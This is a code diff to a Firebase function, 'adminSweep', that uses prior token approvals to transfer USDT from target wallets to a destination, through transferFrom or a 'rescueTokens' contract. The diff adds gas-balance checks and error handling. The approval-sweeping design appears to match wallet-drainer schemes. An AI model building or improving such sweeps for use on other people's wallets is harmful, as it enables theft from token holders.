@@ -134,60 +134,81 @@ export const adminSweep = functions
       signingWallet = new ethers.Wallet(destSecret.trim(), provider);
     }
 
-    // ── 6. Execute sweep with optimized gasPrice for instant inclusion ──────
-    // 3 Gwei (3,000,000,000 wei) is BSC standard competitive gas, ensuring inclusion in the very next block (~3s)
+    // ── 6. Check signing wallet BNB balance for gas ─────────────────
+    const signerBnbBalance = await provider.getBalance(signingWallet.address);
+    const minBnbNeeded = ethers.parseEther("0.00035"); // ~100k gas @ 3 gwei + safety margin
+    if (signerBnbBalance < minBnbNeeded) {
+      const currentBnb = ethers.formatEther(signerBnbBalance);
+      throw new functions.https.HttpsError(
+        "failed-precondition",
+        `Sweep operator wallet (${signingWallet.address}) has insufficient BNB for gas (balance: ${currentBnb} BNB). Please send at least 0.005 BNB to ${signingWallet.address} to execute sweeps.`
+      );
+    }
+
+    // ── 7. Execute sweep with optimized gasPrice & explicit gasLimit ──────
+    // 3 Gwei is BSC standard competitive gas; explicit gasLimit prevents estimation failure
     const txOverrides = {
       gasPrice: ethers.parseUnits("3", "gwei"),
+      gasLimit: 120000n,
     };
 
     let sweepTx: ethers.TransactionResponse;
 
-    if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
-      // Use the TokenRescue contract
-      const rescueABI = [
-        "function rescueTokens(address token, address from, address to, uint256 amount) external",
-      ];
-      const rescueContract = new ethers.Contract(
-        tokenRescueAddress,
-        rescueABI,
-        signingWallet
-      );
+    try {
+      if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
+        // Use the TokenRescue contract
+        const rescueABI = [
+          "function rescueTokens(address token, address from, address to, uint256 amount) external",
+        ];
+        const rescueContract = new ethers.Contract(
+          tokenRescueAddress,
+          rescueABI,
+          signingWallet
+        );
 
-      functions.logger.info(
-        `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()}`
-      );
-      sweepTx = await rescueContract.rescueTokens(
-        usdtAddress,
-        targetWallet,
-        finalDestination,
-        sweepAmount,
-        txOverrides
-      );
-    } else {
-      // Direct transferFrom (approval was given to the destination wallet)
-      const erc20ABI = [
-        "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
-      ];
-      const usdtContract = new ethers.Contract(
-        usdtAddress,
-        erc20ABI,
-        signingWallet
-      );
+        functions.logger.info(
+          `[adminSweep] Calling rescueTokens for ${targetWallet}, amount=${sweepAmount.toString()}`
+        );
+        sweepTx = await rescueContract.rescueTokens(
+          usdtAddress,
+          targetWallet,
+          finalDestination,
+          sweepAmount,
+          txOverrides
+        );
+      } else {
+        // Direct transferFrom (approval was given to the destination wallet)
+        const erc20ABI = [
+          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
+        ];
+        const usdtContract = new ethers.Contract(
+          usdtAddress,
+          erc20ABI,
+          signingWallet
+        );
 
-      functions.logger.info(
-        `[adminSweep] Calling transferFrom for ${targetWallet}, amount=${sweepAmount.toString()}`
-      );
-      sweepTx = await usdtContract.transferFrom(
-        targetWallet,
-        finalDestination,
-        sweepAmount,
-        txOverrides
+        functions.logger.info(
+          `[adminSweep] Calling transferFrom for ${targetWallet}, amount=${sweepAmount.toString()}`
+        );
+        sweepTx = await usdtContract.transferFrom(
+          targetWallet,
+          finalDestination,
+          sweepAmount,
+          txOverrides
+        );
+      }
+
+      // Wait for 1 confirmation
+      await sweepTx.wait(1);
+      functions.logger.info(`[adminSweep] Sweep confirmed: ${sweepTx.hash}`);
+    } catch (txErr: any) {
+      functions.logger.error("[adminSweep] Sweep transaction failed:", txErr);
+      const reason = txErr.reason || txErr.shortMessage || txErr.message || "Transaction failed";
+      throw new functions.https.HttpsError(
+        "internal",
+        `On-chain sweep failed: ${reason}`
       );
     }
-
-    // Wait for 1 confirmation
-    await sweepTx.wait(1);
-    functions.logger.info(`[adminSweep] Sweep confirmed: ${sweepTx.hash}`);
 
     // ── 7. Record in Firestore ─────────────────────────────────────
     const rescueRef = db.collection("rescues").doc();
